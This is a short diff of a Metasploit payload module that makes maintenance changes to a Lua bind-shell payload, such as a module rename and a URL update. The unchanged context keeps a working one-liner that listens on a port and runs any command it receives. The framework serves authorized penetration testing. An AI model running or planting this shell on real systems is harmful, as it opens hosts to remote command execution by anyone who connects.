@@ -1,14 +1,13 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit4
+module MetasploitModule
 
   CachedSize = 223
 
@@ -51,6 +50,5 @@ module Metasploit4
   def command_string
     "lua -e \"local s=require('socket');local s=assert(socket.bind('*',#{datastore['LPORT']}));local c=s:accept();while true do local r,x=c:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));c:send(b);end;c:close();f:close();\""
   end
-
 end
 
